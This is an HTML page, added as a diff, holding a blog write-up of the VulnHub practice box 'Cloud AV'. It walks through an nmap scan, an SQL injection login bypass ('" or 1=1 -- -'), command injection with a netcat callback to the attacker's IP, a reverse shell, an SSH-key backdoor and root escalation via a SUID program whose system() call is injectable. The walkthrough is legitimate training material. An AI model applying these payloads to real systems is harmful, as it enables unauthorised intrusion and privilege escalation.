@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html lang="en-us">
+  <head>
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/atom-one-light.min.css">
+    <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
+    <script>hljs.initHighlightingOnLoad();</script>
+
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png">
+    <link rel="manifest" href="/images/site.webmanifest">
+
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="My write-up for Cloud AV, a VulnHub box created by BoredHackerBlog.">
+    <title>VulnHub: Cloud AV | ben-dale.co.uk</title>
+    <link rel="stylesheet" href="/css/style.css" />
+    <link rel="stylesheet" href="/css/fonts.css" />
+    <link rel="stylesheet" href="/css/theme-override.css">
+    <header>
+
+  <nav>
+    <ul>
+      
+      
+      <li class="pull-left ">
+        <a href="/">~/ben-dale.co.uk</a>
+      </li>
+      
+      
+      <li class="pull-left ">
+        <a href="/tags/">~/tags</a>
+      </li>
+      
+
+      
+      
+      <li class="pull-right">
+        <a href="/index.xml">~/rss</a>
+      </li>
+      
+
+    </ul>
+  </nav>
+</header>
+
+  </head>
+
+  <body>
+    <br/>
+
+<div class="article-meta">
+<h1><span class="title">VulnHub: Cloud AV</span></h1>
+
+<h2 class="date">2020/04/05</h2>
+<p class="terms">
+  
+  
+  
+  
+  Tags: <a href="/tags/sqli">sqli</a> <a href="/tags/rce">rce</a> <a href="/tags/command-injection">command-injection</a> 
+  
+  
+</p>
+</div>
+
+
+<div class="content-wrapper">
+  <main>
+    <p>Here&rsquo;s my write-up for <a href="https://www.vulnhub.com/entry/boredhackerblog-cloud-av,453/">Cloud AV</a>, a VulnHub box created by <a href="http://www.boredhackerblog.info/">BoredHackerBlog</a>.</p>
+<h3 id="write-up">Write-up</h3>
+<p>The description for this box states the following:</p>
+<pre><code>Cloud Anti-Virus Scanner! is a cloud-based antivirus scanning service.
+
+Currently, it's in beta mode. You've been asked to test the setup and find vulnerabilities and escalate privs.
+
+Difficulty: Easy
+
+Tasks involved:
+    port scanning
+    webapp attacks
+    sql injection
+    command injection
+    brute forcing
+    code analysis
+
+Virtual Machine:
+    Format: Virtual Machine (Virtualbox OVA)
+    Operating System: Linux
+
+Networking:
+    DHCP Service: Enabled
+    IP Address Automatically assign
+
+
+This works better with VirtualBox than VMware 
+</code></pre><p>The listed tasks are exploits I have some familiarity with so I decided that this would be a good box to brush up some techniques.</p>
+<p>Once I found out what IP the box was running on I scanned the ports using <code>nmap</code>:</p>
+<pre><code>kali@kali:~/Documents/vulnhub/borderhackerblog/cloud_av$ nmap -sC -sV 192.168.1.245
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-05 05:06 EDT
+Nmap scan report for cloudav (192.168.1.245)
+Host is up (0.00042s latency).
+Not shown: 998 closed ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 6a:42:4b:7c:2a:06:0f:50:4b:32:cf:b8:31:e9:c4:f4 (RSA)
+|   256 81:c7:60:0f:d7:1e:56:f7:a3:1e:9f:76:27:bd:31:27 (ECDSA)
+|_  256 71:90:c3:26:ba:3b:e8:b3:53:7e:73:53:27:4d:6b:af (ED25519)
+8080/tcp open  http    Werkzeug httpd 0.14.1 (Python 2.7.15rc1)
+|_http-server-header: Werkzeug/0.14.1 Python/2.7.15rc1
+|_http-title: Site doesn't have a title (text/html; charset=utf-8).
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre><p><code>nmap</code> found two ports open: <code>22</code> and <code>8080</code>. I took a look at <code>8080</code> first.</p>
+<p><img src="/static/cloudav/1.png" alt=""></p>
+<p>The page returned on port <code>8080</code> shows a message asking for an invite code so that you can gain access to the system and &ldquo;start testing&rdquo;. I managed to invoke an error page, inputting a single double quote-mark:</p>
+<p><img src="/static/cloudav/2.png" alt=""></p>
+<p>Looking closely at the error message, I could see the underlying SQL query:</p>
+<p><img src="/static/cloudav/3.png" alt=""></p>
+<p>It was possible to bypass this screen and gain an active session using the input: <code>&quot; or 1=1 -- -</code></p>
+<p><img src="/static/cloudav/4.png" alt=""></p>
+<p>Once I had access I was redirected to a <code>/scan</code> page that prompted me for some input.</p>
+<p><img src="/static/cloudav/5.png" alt=""></p>
+<p>After playing around with this input form for a couple of minutes I decided to have a look at the request in Burp.</p>
+<p><img src="/static/cloudav/6.png" alt=""></p>
+<p>Given the input for this request, and the output of the response I presumed this request was running shell commands under the hood. I verified this by throwing different commands at the endpoint until one returned something interesting:</p>
+<p><img src="/static/cloudav/7.png" alt=""></p>
+<p>I had executed <code>pwd</code> on the box. To confirm this (and to see how far I could push this) I used <code>netcat</code> to listen out for incoming connections on port <code>8000</code> on my machine (<code>nc -lvp 8000</code>) and attempted to make a call back to my machine from this injection point.</p>
+<p>I used Burp to send another request, with the payload: <code>nc 192.168.1.249 8000</code> and saw that a connection was made from the box:</p>
+<p><img src="/static/cloudav/8.png" alt=""></p>
+<p>Although I had verified that connections could be made back to my machine I still didn&rsquo;t have a reverse shell. After trying several different reverse shell payloads I managed to get a python reverse shell working:</p>
+<p><img src="/static/cloudav/9.png" alt=""></p>
+<p><img src="/static/cloudav/10.png" alt=""></p>
+<p>I was logged in as user <code>scanner</code>. I had a quick look around on the box and then moved to the home directory of <code>scanner</code> to find out what was there.</p>
+<p><img src="/static/cloudav/11.png" alt=""></p>
+<p>Looking closely at the output of <code>ls -l</code> above I could see that <code>update_cloudav</code> ran as root, as the SUID bit was set and the owner was <code>root</code>. The source code for <code>update_cloudav</code> was also made available in <code>update_cloudav.c</code>.</p>
+<pre><code>#include &lt;stdio.h&gt;
+
+int main(int argc, char *argv[]) {
+    char *freshclam=&quot;/usr/bin/freshclam&quot;;
+
+    if (argc &lt; 2){
+        printf(&quot;This tool lets you update antivirus rules\nPlease supply command line arguments for freshclam\n&quot;);
+        return 1;
+    }
+
+    char *command = malloc(strlen(freshclam) + strlen(argv[1]) + 2);
+    sprintf(command, &quot;%s %s&quot;, freshclam, argv[1]);
+    setgid(0);
+    setuid(0);
+    system(command);
+    return 0;
+}
+</code></pre><p>Here, the <code>system</code> method will run whatever is in the <code>command</code> variable as <code>root</code>. The goal was to inject a malicious shell command into <code>command</code>.</p>
+<p>I tried a couple of different things but I quickly got bored with the crappy reverse shell. I remembered that port <code>22</code> was open and decided to generate an ssh key for user <code>scanner</code> and log in over ssh, so I didn&rsquo;t drop the reverse shell every time I cmd+C&rsquo;d.</p>
+<p><img src="/static/cloudav/12.png" alt=""></p>
+<p>I copied the private key on to my machine and had to change some perms on the key so that I could use it:</p>
+<p><img src="/static/cloudav/13.png" alt=""></p>
+<p>I also forgot to write the public key to the <code>authorized_keys</code> file on the <code>scanner</code> user. After doing that I logged in as <code>scanner</code> over ssh.</p>
+<p><img src="/static/cloudav/14.png" alt=""></p>
+<p>This probably wasn&rsquo;t necessary in the long run but hey, installing backdoors is interesting.</p>
+<p>After reading a couple of blog posts on how <code>system</code> shouldn&rsquo;t be used (for security reasons) I looked back at the code for <code>update_cloudav</code> and identified an injection point:</p>
+<pre><code>sprintf(command, &quot;%s %s&quot;, freshclam, argv[1]);
+</code></pre><p>Messing around with the quote marks using the input that I controlled (<code>argv[1]</code>) in the above command allowed me to run a command as root:</p>
+<p><img src="/static/cloudav/15.png" alt=""></p>
+<p>Once I had confirmed I could run commands as <code>root</code> I entered a slightly more nefarious payload&hellip;</p>
+<p><img src="/static/cloudav/16.png" alt=""></p>
+<p>and root access was gained. I had a quick look around for some flags but didn&rsquo;t find any in the usual places, but considering I had root access I decided that this box was &ldquo;done&rdquo;.</p>
+<h3 id="final-thoughts">Final thoughts</h3>
+<p>This box was a little easier than some of the other boxes I&rsquo;ve worked on (and is labelled as such so go figure) but was great for brushing up on a little bit of command injection. Thanks BoredHackerBlog!</p>
+
+    <a href="/"> >> Home</a>
+  </main>
+</div>
+    <footer>
+      
+<script>
+(function() {
+  function center_el(tagName) {
+    var tags = document.getElementsByTagName(tagName), i, tag;
+    for (i = 0; i < tags.length; i++) {
+      tag = tags[i];
+      var parent = tag.parentElement;
+      
+      if (parent.childNodes.length === 1) {
+        
+        if (parent.nodeName === 'A') {
+          parent = parent.parentElement;
+          if (parent.childNodes.length != 1) continue;
+        }
+        if (parent.nodeName === 'P') parent.style.textAlign = 'center';
+      }
+    }
+  }
+  var tagNames = ['img', 'embed', 'object'];
+  for (var i = 0; i < tagNames.length; i++) {
+    center_el(tagNames[i]);
+  }
+})();
+</script>
+
+      
+      <hr/>
+      <a href="https://github.com/ben-dale">Github</a> | <a href="https://keybase.io/mrbenjamind">Keybase</a> | <a href="https://twitter.com/mrbenjamind">Twitter</a>
+      
+    </footer>
+    
+  </body>
+</html>
+
